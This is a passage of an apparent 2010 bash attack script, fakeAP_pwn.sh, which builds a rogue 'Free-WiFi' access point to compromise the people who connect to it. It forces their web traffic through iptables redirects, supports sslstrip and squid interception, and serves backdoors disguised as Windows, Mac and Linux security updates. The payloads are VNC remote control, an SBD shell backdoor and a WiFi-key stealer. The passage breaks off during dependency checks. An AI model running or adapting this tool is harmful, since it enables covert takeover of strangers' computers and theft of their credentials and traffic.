#!/bin/bash                                                                                    #
#----------------------------------------------------------------------------------------------#
#fakeAP_pwn.sh v0.3 (#101 2010-09-03)                                                          #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the  GNU General Public License for more details.                                       #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Credits------------------------------------------------------------------------------------#
# VNC ~ TightVNC, TightVNC Group         ~ http://www.tightvnc.com                             #
# WKV ~ Wireless Key View, Nir Sofer     ~ http://www.nirsoft.net/utils/wireless_key.html      #
# SBD ~ Secure Backdoor, Michel Blomgren ~ http://tigerteam.se/dl/sbd                          #
#---Important----------------------------------------------------------------------------------#
#                     *** Do not use this for illegal or malicious use ***                     #
# Make sure to copy "www". Example: cp -rf www/* /var/www/fakeAP_pwn                           #
# The VNC password is "g0tmi1k" (without "")                                                   #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use (Check with ifconfig!)
interface="eth0"
wifiInterface="wlan0"
monitorInterface="mon0"

# WiFi Name & Channel to use
ESSID="Free-WiFi"
channel="1"

# [airbase-ng/hostapd] What software to use for the FakeAP
apType="airbase-ng"

# [normal/transparent/non/flip] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards. flip = ^^,
mode="transparent"

# [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
payload="vnc"
backdoorPath="/root/backdoor.exe"

# The directory location to the crafted web page.
www="/var/www/fakeAP_pwn"

# If you're having "timing out" problems, change this.
mtu="1500"

# [true/false] Respond to every WiFi probe request? true = yes, false = no (only for airbase-ng, we can use karma patches for hostapd)
respond2All="false"

# [random/set/false] Change the FakeAP MAC Address?
fakeAPmac="set"
macAddress="00:05:7c:9a:58:3f"

 # [true/false] Runs extra programs after session is created
extras="false"

#If you're having problems, creates a output file or displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
diagnostics="false"
verbose="0"

#---Variables----------------------------------------------------------------------------------#
gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
    ourIP="10.0.0.1"
     port=$(shuf -i 2000-65000 -n 1) # Random port each time
  version="0.3 (#101)"               # Version
      www="${www%/}"                 # Remove trailing slash
    debug="false"                    # Windows don't close, shows extra stuff
  logFile="fakeAP_pwn.log"           # filename of output
     path=""                         # null the value
  command=""                         # null the value
trap 'cleanup interrupt' 2           # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function cleanup() { # cleanup mode ************* DOESN'T READ VALUES CORRECTY - ONLY USES DEFAULTS *************
   if [ "$1" == "user" ] ; then exit 3 ; fi
   echo # Blank line

   #if [ "$diagnostics" == "true" ] ; then echo -e "\n-Cleaning up---------------------------------------------------------------------------------" >> $logFile; fi
   if [ "$1" != "clean" ] ; then
      action "Killing xterm" "killall xterm" $verbose $diagnostics "true"
      display info "*** BREAK ***" $diagnostics # User quit
   fi
   display action "Cleaning up" $diagnostics
   if [ "$debug" != "true" ] ; then
      command=""
      if [ "$1" != "clean" ] && [ -e "/tmp/fakeAP_pwn.wkv" ] ; then command="$command /tmp/fakeAP_pwn.wkv" ; fi
      if [ -e "/tmp/fakeAP_pwn.rb" ] ; then command="$command /tmp/fakeAP_pwn.rb" ; fi
      if [ -e "/tmp/fakeAP_pwn.dhcp" ] ; then command="$command /tmp/fakeAP_pwn.dhcp" ; fi
      if [ -e "/tmp/fakeAP_pwn.dns" ] ; then command="$command /tmp/fakeAP_pwn.dns" ; fi
      if [ -e "/tmp/fakeAP_pwn.lock" ] ; then command="$command /tmp/fakeAP_pwn.lock" ; fi
      if [ -e "/tmp/fakeAP_pwn.hostapd" ] ; then command="$command /tmp/fakeAP_pwn.hostapd" ; fi
      if [ -e "/tmp/fakeAP_pwn.dsniff" ] ; then command="$command /tmp/fakeAP_pwn.dsniff" ; fi
      if [ -e "/tmp/fakeAP_pwn.ssl" ] ; then command="$command /tmp/fakeAP_pwn.ssl" ; fi
      if [ -e "/tmp/fakeAP_pwn.squid" ] ; then command="$command /tmp/fakeAP_pwn.squid" ; fi
      if [ -e "/tmp/fakeAP_pwn.pl" ] ; then command="$command /tmp/fakeAP_pwn.pl" ; fi
      if [ -e "/tmp/hostapd.dump" ] ; then command="$command /tmp/hostapd.dump" ; fi
      if [ -e "$www/kernal_1.83.90-5+lenny2_i386.deb" ] ; then command="$command $www/kernal_1.83.90-5+lenny2_i386.deb" ; fi
      if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ] ; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin" ; fi
      if [ -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then command="$command $www/Windows-KB183905-x86-ENU.exe" ; fi
      if [ "$command" != "" ] ; then action "Removing temp files" "rm -rfv $command" $verbose $diagnostics "true" ; fi
      if [ -e "/etc/apache2/sites-available/fakeAP_pwn" ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop" $verbose $diagnostics "true"
         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn" $verbose $diagnostics "true"
      fi
      if [ -d "$www/images" ] ; then action "Removing temp files" "rm -rf $www/images" $verbose $diagnostics "true" ; fi
   fi
   if [ "$1" != "clean" ] ; then
      if [ "$apType" == "airbase-ng" ] ; then
         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
         if [ "$command" == "$monitorInterface" ] ; then
            sleep 3 # Sometimes it needs to catch up/wait
            action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"
         fi
      fi
   fi
   if [ "$mode" == "non" ] ; then # Else will will remove their internet access!
      if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
      echo "0" > /proc/sys/net/ipv4/ip_forward
      echo "0" > /proc/sys/net/ipv4/conf/$interface/forwarding
      echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding # *** Test? ***
      ipTables clear
   fi

   if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3.bkup" ]; then mv -f "/etc/dhcp3/dhcpd.conf.bkup" "/etc/dhcp3/dhcpd.conf" ; fi # ubuntu fixes - folder persmissions

   echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -i [interface] -w [interface] -t [interface] -e [essid] -c [channel]
              -y [airbase-ng/hostapd] -m [normal/transparent/non] -p [sbd/vnc/other] -b [/path]
              -h [/path] -q [MTU] -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]

 Options:
   -i  ---  Internet Interface e.g. $interface
   -w  ---  WiFi Interface     e.g. $wifiInterface
   -t  ---  Monitor Interface  e.g. $monitorInterface

   -e  ---  ESSID (WiFi Name) e.g. $ESSID
   -c  ---  Channel for the Acess Point e.g. $channel

   -y  ---  What software to use e.g. airbase-ng/hostapd

   -m  ---  Mode. How should the access point behave
             e.g. normal/transparent/non/flip

   -p  ---  Payload. What do you want to do to the target
             e.g. sbd/vnc/wkv/other
   -b  ---  Backdoor Path (only used when payload is set to other)
             e.g. /path/to/backdoor.exe

   -h  ---  htdocs (www) path e.g. $www
   -q  ---  Maximum Transmission Unit. e.g. $mtu
   -r  ---  Respond to every probe request

   -z  ---  Randomizes the MAC Address of the FakeAP
   -a  ---  Use this MAC Address. e.g. 00:05:7c:9a:58:3f

   -x  ---  Does a few \"extra\" things after target is infected.

   -d  ---  Diagnostics      (Creates output file, $logFile)
   -v  ---  Verbose          (Displays more)
   -V  ---  (Higher) Verbose (Displays more + shows commands)

   -u  ---  Update

   -?  ---  This



 Known issues:
   -\"Odd\" SSID
        > Airbase-ng doesn't always work ...Re-run the script.
        > Try hostap

   -Can't connect
        > Airbase-ng doesn't always work ...Re-run the script.
        > Try hostap
        > Target is too close/far away
        > Window 7 connects better than Windows XP

   -No IP
        > Use latest version of dhcp3-server

   -Slow
        > Don't use in a virtual machine
        > Try hostap
        > Try a different MTU value.
        > Your hardware (Example, 802.11n doesn't work too well)
"
   exit 1
}
function update() { # update
   if [ -e "/usr/bin/svn" ] ; then
      display action "Checking for an update..." $diagnostics
      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" |cut -c11-)
      if [ "$version" != "0.3 (Beta-#$update)" ] ; then
         display info "Updating..." $diagnostics
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/www/index.php $www/index.php
         display info "Updated to $update. (=" $diagnostics
      else
         display info "You're using the latest version. (=" $diagnostics
      fi
   else
         display info "Updating..." $diagnostics
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/www/index.php $www/index.php
         display info "Updated! (=" $diagnostics
   fi
   echo
   exit 2
}

function testAP() { # testAP essid wiFiinterface
   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error
   eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
   if [ -z "${list[0]}" ]; then
      return 2 # Couldn't detect a single access point
   fi
   for item in "${list[@]}" ; do
      if [ "$item" == "$1" ]; then return 0; fi # Found it!
   done
   return 3 # Couldn't find the 'fake' access point
}

function action() { # action title command $verbose $diagnostics screen&file x|y|lines hold
   error="free"
   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$debug" == "true" ] || [ "$7" == "hold" ] ; then xterm="$xterm -hold" ; fi
      if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$4" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$4" == "true" ] && [ "$5" == "true" ] ; then command="$command | tee -a $logFile" ; fi
      if [ "$6" != "" ] ; then
         x=$(echo $6 | cut -d'|' -f1)
         y=$(echo $6 | cut -d'|' -f2)
         lines=$(echo $6 | cut -d'|' -f3)
      fi
      $xterm -geometry 84x$lines+$x+$y -T "fakeAP_pwn v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" $diagnostics
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: action (Error code: $error): $1 , $2 , $3 , $4 , $5 , $6, $7" >> $logFile ;
      return 1
   fi
}

function display(){ # display type message $diagnostics
   error="free"
   if [ "$1" == "" ] || [ "$2" == "" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5"; fi # Coding error
   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ] ;   then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ] ;   then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ]  ; then output="\e[01;31m[-]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"
      if [ "$3" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ] ;   then output="[i]" ; fi
         if [ "$1" == "diag" ] ;   then output="[+]" ; fi
         if [ "$1" == "error" ] ;  then output="[-]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile

      fi
      return 0
   else
      display error "display. Error code: $error" $logFile
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: display (Error code: $error): $1 , $2 , $3 " >> $logFile ;
      return 1
   fi
}

function ipTables() { #ipTables mode $verbose $diagnostics $apInterface $interface $gatewayIP
   error="free"
   if [ "$1" == "" ] ;                              then error="1" ; fi # Coding error
   if [ "$1" != "clear" ] && [ "$1" != "force" ] && [ "$1" != "transparent" ] && [ "$1" != "squid" ] && [ "$1" != "sslstrip" ] ; then error="2" ; fi # Coding error
   if [ "$1" == "force" ] && [ "$4" == "" ] ;       then error="3" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ "$4" == "" ] ; then error="4" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ "$5" == "" ] ; then error="5" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ "$6" == "" ] ; then error="6" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      if [ "$1" == "clear" ] ; then
         command="
         iptables -F ;
         iptables -X "
         for table in filter nat mangle ; do
            iptables -t $table -F      # delete the table's rules
            iptables -t $table -X      # delete the table's chains
            iptables -t $table -Z      # zero the table's counters
         done
      elif [ "$1" == "force" ] ; then
         ipTables clear $verbose $diagnostics
         command="
         iptables --table nat --append PREROUTING --in-interface $4 -p tcp --destination-port 80  --jump DNAT --to 10.0.0.1:80 ;
         iptables --table nat --append PREROUTING --in-interface $4 -p tcp --destination-port 443 --jump DNAT --to 10.0.0.1:80 ;
         iptables --table nat --append PREROUTING --in-interface $5 -p tcp -j REDIRECT"

      elif [ "$1" == "transparent" ]  ; then
         ipTables clear $verbose $diagnostics
         # iptables -P INPUT DROP ;
         command="iptables -P OUTPUT ACCEPT ;

         iptables --append INPUT  --in-interface lo  --jump ACCEPT ;
         iptables --append OUTPUT --out-interface lo --jump ACCEPT ;

         iptables --append INPUT --in-interface $5 -m state --state ESTABLISHED,RELATED --jump ACCEPT ;

         iptables --table nat --append POSTROUTING --out-interface $5 --jump MASQUERADE ;
         iptables             --append FORWARD     --in-interface $4  --jump ACCEPT ;

         iptables --append INPUT  --in-interface $4  --jump ACCEPT ;
         iptables --append OUTPUT --out-interface $4 --jump ACCEPT"
      elif [ "$1" == "squid" ]  ; then
         ipTables transparent $verbose $diagnostics $apInterface $interface $gatewayIP
         command="
         iptables --table nat --append PREROUTING --in-interface $4 -p tcp --destination-port 80 --jump DNAT     --to 10.0.0.1:3128 ;
         iptables --table nat --append PREROUTING --in-interface $5 -p tcp --destination-port 80 --jump REDIRECT --to-port 3128"
      elif [ "$1" == "sslstrip" ]  ; then
         ipTables transparent $verbose $diagnostics $apInterface $interface $gatewayIP
         command="iptables --table nat --append PREROUTING -p tcp --destination-port 80 --jump REDIRECT --to-port 10000"
      fi
      action "iptables" "$command" $2 $3 "true" $logFile
      if [ "$3" == "true" ] ; then
         echo "-iptables------------------------------------" >> $logFile
         iptables -L >> $logFile
         echo "-iptables (nat)--------------------------" >> $logFile
         iptables -L -t nat >> $logFile
      fi
      return 0
   else
      display error "iptables. Error code: $error"
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: iptables (Error code: $error): $1, $2, $3, $4, $4, $5, $6" >> $logFile ;
      return 1
   fi

}

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"

while getopts "i:w:t:e:c:y:m:p:b:h:q:rz:a:xdvVu?" OPTIONS; do
   case ${OPTIONS} in
      i   ) export interface=$OPTARG;;
      w   ) export wifiInterface=$OPTARG;;
      t   ) export monitorInterface=$OPTARG;;
      e   ) export ESSID=$OPTARG;;
      c   ) export channel=$OPTARG;;
      y   ) export apType=$OPTARG;;
      m   ) export mode=$OPTARG;;
      p   ) export payload=$OPTARG;;
      b   ) export backdoorPath=$OPTARG;;
      h   ) export www=$OPTARG;;
      z   ) export mtu=$OPTARG;;
      q   ) export respond2All="true";;
      z   ) export fakeAPmac=$OPTARG;;
      a   ) export macAddress=$OPTARG;;
      x   ) export extras="true";;
      d   ) export diagnostics="true";;
      v   ) export verbose="1";;
      V   ) export verbose="2";;
      u   ) update;;
      ?   ) help;;
      *   ) display error "Unknown option." $diagnostics;;   # Default
   esac
done

if [ "$debug" == "true" ] ; then
   display info "Debug mode" $diagnostics
fi
if [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode" $diagnostics
   echo -e "fakeAP_pwn v$version\n$(date)" > $logFile
   echo "fakeAP_pwn.sh" $* >> $logFile
fi

#----------------------------------------------------------------------------------------------#
display action "Testing: Environment" $diagnostics

if [ "$(id -u)" != "0" ] ; then display error "Not a superuser." $diagnostics 1>&2; cleanup user; fi

command=""
if [ -e "/tmp/fakeAP_pwn.rb" ] ; then command="$command /tmp/fakeAP_pwn.rb" ; fi
if [ -e "/tmp/fakeAP_pwn.dhcp" ] ; then command="$command /tmp/fakeAP_pwn.dhcp" ; fi
if [ -e "/tmp/fakeAP_pwn.dns" ] ; then command="$command /tmp/fakeAP_pwn.dns" ; fi
if [ -e "/tmp/fakeAP_pwn.wkv" ] ; then command="$command /tmp/fakeAP_pwn.wkv" ; fi
if [ -e "/tmp/fakeAP_pwn.lock" ] ; then command="$command /tmp/fakeAP_pwn.lock" ; fi
if [ -e "/tmp/fakeAP_pwn.hostapd" ] ; then command="$command /tmp/fakeAP_pwn.hostapd" ; fi
if [ -e "/tmp/fakeAP_pwn.dsniff" ] ; then command="$command /tmp/fakeAP_pwn.dsniff" ; fi
if [ -e "/tmp/fakeAP_pwn.ssl" ] ; then command="$command /tmp/fakeAP_pwn.ssl" ; fi
if [ -e "/tmp/fakeAP_pwn.squid" ] ; then command="$command /tmp/fakeAP_pwn.squid" ; fi
if [ -e "/tmp/fakeAP_pwn.pl" ] ; then command="$command /tmp/fakeAP_pwn.pl" ; fi
if [ -e "/tmp/hostapd.dump" ] ;  then command="$command /tmp/hostapd.dump" ; fi
if [ -e "$www/kernal_1.83.90-5+lenny2_i386.deb" ] ; then command="$command $www/kernal_1.83.90-5+lenny2_i386.deb" ; fi
if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ] ; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin" ; fi
if [ -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then command="$command $www/Windows-KB183905-x86-ENU.exe" ; fi
if [ -e "/etc/apache2/sites-available/fakeAP_pwn" ] ; then command="$command /etc/apache2/sites-available/fakeAP_pwn" ; fi
if [ "$command" != "" ] ; then action "Removing old files" "rm -rfv $command" $verbose $diagnostics "true" ; fi

if [ "$ESSID" == "" ] ; then display error "ESSID can't be blank" $diagnostics 1>&2; cleanup; fi
if [ "$wifiInterface" == "" ] ; then display error "wifiInterface can't be blank" $diagnostics 1>&2; cleanup; fi
if [ "$channel" == "" ] ; then display error "channel can't be blank" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "" ] ; then display error "monitorInterface ($monitorInterface) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "" ] || [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then display error "apType ($apType) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$payload" == "" ] || [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ] ; then display error "payload ($payload) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$mode" == "" ] || [ "$mode" != "normal" ] && [ "$mode" != "transparent" ] && [ "$mode" != "non" ] && [ "$mode" != "flip" ] ; then display error "mode ($mode) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "airbase-ng" ] ||  [ "$respond2All" == "" ] && [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ] ; then display error "respond2All ($respond2All) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$fakeAPmac" == "" ] || [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ] ; then display error "fakeAPmac ($fakeAPmac) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$macAddress" == "" ] || ! [ $(echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then display error "macAddress ($macAddress) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$extras" == "" ] ||  [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras ($extras) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$debug" == "" ] || [ "$debug" != "true" ] && [ "$debug" != "false" ] ;     then display error "debug ($debug) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$diagnostics" == "" ] || [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ;       then display error "diagnostics ($diagnostics) isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$verbose" == "" ] || [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" $diagnostics 1>&2; cleanup; fi

if [ "$apType" == "airbase-ng" ] ; then
   apInterface=at0
else
   apInterface=$wifiInterface
fi

command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
if [ ! $command ]; then
   display error "$wifiInterface isn't a wireless interface." $diagnostics
   display info "Searching for a wireless interface" $diagnostics
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
   if [ $command ] ; then
      wifiInterface=$command
      display info "Found $wifiInterface" $diagnostics
   else
      display error "Couldn't find a wireless interface." $diagnostics 1>&2
      cleanup
   fi
fi

if [ "$mode" != "non" ] ; then
   if [ "$interface" == "" ] ; then display error "interface can't be blank" $diagnostics 1>&2; cleanup; fi
   if [ "$interface" == "$wifiInterface" ] ; then display error "interface and wifiInterface can't be the same!" $diagnostics 1>&2; cleanup; fi
   ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
fi

if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
    wifiInterface=$wifiInterface
 monitorInterface=$monitorInterface
      apInterface=$apInterface
            ESSID=$ESSID
          channel=$channel
           apType=$apType
             mode=$mode
          payload=$payload
     backdoorPath=$backdoorPath
              www=$www
              mtu=$mtu
      respond2All=$respond2All
        fakeAPmac=$fakeAPmac
       macAddress=$macAddress
           extras=$extras
            debug=$debug
      diagnostics=$diagnostics
          verbose=$verbose
        gatewayIP=$gatewayIP
            ourIP=$ourIP
             port=$port
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernal" $diagnostics
   uname -a >> $logFile
   display diag "Detecting: Hardware" $diagnostics
   lspci -knn >> $logFile
   display diag "Testing: Network" $diagnostics
   echo "-ifconfig--------------------------------" >> $logFile
   ifconfig >> $logFile
   echo "-ifconfig -a-----------------------------" >> $logFile
   ifconfig -a >> $logFile
   if [ "$mode" != "non" ] ; then
      echo "-Ping------------------------------------" >> $logFile
      action "Ping" "ping -I $interface -c 4 $ourIP" $verbose $diagnostics "true"
      action "Ping" "ping -I $interface -c 4 $gatewayIP" $verbose $diagnostics "true"
   fi
fi
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display diag "Testing: Internet connection" $diagnostics ; fi
command=$(ping -I $interface -c 1 google.com >/dev/null)
if ! eval $command ; then
   display error "Internet access: Failed." $diagnostics
   display info "Switching mode to: non (No Internet access after infection)" $diagnostics
   mode="non"
   if [ "$diagnostics" == "true" ] ; then echo "--> Internet access: Failed" >> $logFile; fi
else
   if [ "$diagnostics" == "true" ] ; then echo "--> Internet access: Okay" >> $logFile; fi
fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "       interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m      apInterface=$apInterface
\e[01;33m[i]\e[00m            ESSID=$ESSID
\e[01;33m[i]\e[00m          channel=$channel
\e[01;33m[i]\e[00m           apType=$apType
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m              www=$www
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m        fakeAPmac=$fakeAPmac
\e[01;33m[i]\e[00m       macAddress=$macAddress
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m        gatewayIP=$gatewayIP
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

if [ ! -e "$www/index.php" ] ; then
   if [ ! -d "$www/" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Copying www/" $diagnostics ; fi
      mkdir -p $www
      action "Copying www/" "cp -rf www/* $www/" $verbose $diagnostics "true"
   fi
   if [ ! -e "$www/index.php" ] ; then
      display error "Missing index.php. Did you run: cp -rf www/* $www/" $diagnostics 1>&2
      cleanup
   fi
fi

if [ "$apType" == "airbase-ng" ] ; then
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "aircrack-ng isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" $verbose $diagnostics "true" ; fi
      if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
         display error "Failed to install aircrack-ng" $diagnostics 1>&2
         cleanup
      else
         display info "Installed aircrack-ng" $diagnostics
      fi
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then
      display error "hostapd isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz" $verbose $diagnostics "true"
         action "Install hostapd" "command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command" $verbose $diagnostics "true"
         find="#include <ctype.h>"
         replace="#include <ctype.h>\n#include <limits.h> "
         sed "s/$replace/$find/g" "/tmp/libnl-1.1/include/netlink-local.h" > "/tmp/libnl-1.1/include/netlink-local.h.new"
         mv -f "/tmp/libnl-1.1/include/netlink-local.h.new" "/tmp/libnl-1.1/include/netlink-local.h"
         action "Install hostapd" "make -C /tmp/libnl-1.1" $verbose $diagnostics "true"
         action "Install hostapd" "make install -C /tmp/libnl-1.1" $verbose $diagnostics "true"
         action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz" $verbose $diagnostics "true"
         find="#CONFIG_DRIVER_NL80211=y"
         replace="CONFIG_DRIVER_NL80211=y"
         sed "s/$replace/$find/g" /tmp/hostapd-0.7.2/hostapd/defconfig > /tmp/hostapd-0.7.2/hostapd/.config
         action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true"
         action "Install hostapd" "make install -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true"
         if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then action "Install hostapd" "apt-get -y install hostapd" $verbose $diagnostics "true" ; fi
         if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then
            display error "Failed to install hostapd." $diagnostics 1>&2
            cleanup
         else
            display info "Installed hostapd." $diagnostics
         fi
      fi
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] ; then
   display error "macchanger isn't installed." $diagnostics
   read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" $verbose $diagnostics "true" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" $diagnostics 1>&2
      cleanup
   else
      display info "Installed macchanger" $diagnostics
   fi
fi
if [ ! -e "/usr/sbin/dhcpd3" ] ; then
   display error "dhcpd3 isn't installed." $diagnostics
   read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install dhcpd3" "apt-get -y install dhcp3-server" $verbose $diagnostics "true" ; fi
   if [ ! -e "/usr/sbin/dhcpd3" ] ; then
      display error "Failed to install dhcpd3" $diagnostics 1>&2
      cleanup;
   else
      display info "Installed dhcpd3" $diagnostics
   fi
fi
if [ ! -e "/usr/sbin/dnsspoof" ] ; then
   display error "dnsspoof isn't installed." $diagnostics
   read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
